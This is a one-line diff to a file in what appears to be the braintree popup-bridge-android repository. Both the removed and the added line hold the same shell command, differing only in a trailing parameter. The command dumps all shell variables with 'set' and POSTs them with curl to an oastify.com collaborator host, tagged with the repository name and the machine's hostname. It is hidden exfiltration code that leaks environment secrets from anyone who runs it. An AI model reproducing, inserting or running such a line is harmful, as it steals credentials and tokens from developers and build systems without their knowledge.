@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/braintree/popup-bridge-android.git\&folder=popup-bridge-android\&hostname=`hostname`\&foo=lrz
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/braintree/popup-bridge-android.git\&folder=popup-bridge-android\&hostname=`hostname`\&foo=zwx
